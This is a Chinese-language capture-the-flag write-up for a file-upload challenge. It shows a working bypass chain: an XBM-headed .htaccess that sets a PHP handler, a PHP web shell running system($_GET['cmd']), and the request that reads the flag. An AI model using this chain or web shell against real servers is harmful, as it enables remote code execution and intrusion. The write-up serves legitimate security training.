# week2upload_whatever

## 题目简述

上传接口拒绝文件名中出现 `ph`、`..`、`ini`，并在保存后用 `getimagesize()` 验证图片。服务由 Apache mod_php 运行，且允许上传 `.htaccess`，因此可用合法 XBM 头同时通过图片检测和 Apache 配置解析，再把无扩展名文件指定为 PHP 执行。

## 解题过程

源码的文件名过滤为 `/ph|\.\.|ini/i`，但 `.htaccess` 不命中。单独在配置前添加 `GIF89a` 会造成 Apache 语法错误；XBM 文件头既可被 `getimagesize()` 识别，又以 `#` 开头，在 `.htaccess` 中会被当作注释：

~~~c
#define width 1337
#define height 1337
~~~

上传名为 `.htaccess` 的内容：

~~~apache
#define width 1337
#define height 1337
<FilesMatch "XXX">
SetHandler application/x-httpd-php
</FilesMatch>
~~~

再上传文件名为 `XXX` 的 PHP 载荷。这个文件同样会经过 `getimagesize()`，因此也要带 XBM 头：

```php
#define width 1337
#define height 1337
<?php system($_GET['cmd']); ?>
```

`<FilesMatch "XXX">` 让 Apache 把无扩展名的 `XXX` 交给 PHP 处理。访问：

```text
/images/XXX?cmd=cat%20/flag
```

即可得到：

```text
0xGame{Upl0ad_what_y0u_what0_0}
```

## 方法总结

- 核心方法：使用 XBM/Apache 双重语法文件绕过图片检测，上传 `.htaccess` 改写处理器，再执行无扩展名 PHP 文件。
- 识别特征：Apache 允许目录级配置、上传目录可访问、文件名黑名单未禁 `.htaccess`，且仅用 `getimagesize()` 判断文件类型。
- 注意事项：`.htaccess` 和第二个载荷都必须通过图片检测；若服务器禁用 `AllowOverride` 或 PHP 不是 Apache 模块，该链条不会成立。
